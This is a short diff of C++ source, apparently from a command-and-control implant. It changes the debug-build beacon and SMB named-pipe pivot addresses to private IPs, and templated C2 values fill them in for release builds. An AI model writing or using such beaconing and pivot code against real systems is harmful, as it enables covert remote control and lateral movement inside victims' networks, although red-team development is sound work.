@@ -537,7 +537,7 @@ int Entry() {
 #ifdef  PIVOT
 #ifdef SMBPIVOT
 #ifdef DEBUG
-    unique_ptr<IClient> cli = make_unique<NamedPipeClient>(string{ "namedpipe://192.168.161.30/pipe/foobar" });
+    unique_ptr<IClient> cli = make_unique<NamedPipeClient>(string{ "namedpipe://192.168.157.131/pipe/rand" });
 #else
     // {{range $index, $value := .Config.C2}}                                                                                                                                                                                              
     unique_ptr<IClient> cli = make_unique<NamedPipeClient>(string{ "{{$value}}" });
@@ -567,7 +567,7 @@ int Entry() {
 
     instanceID = uuids::to_string(uuids::uuid_system_generator{}());
 #ifdef DEBUG
-    shared_ptr<Beacon> beacon = make_shared<Beacon>("tcppivot://192.168.161.30:9001", cli);
+    shared_ptr<Beacon> beacon = make_shared<Beacon>("namedpipe://192.168.157.131/pipe/rand", cli);
 #else
     // {{range $index, $value := .Config.C2}}                                                                                                                                                                                              
     shared_ptr<Beacon> beacon = make_shared<Beacon>("{{$value}}", cli);
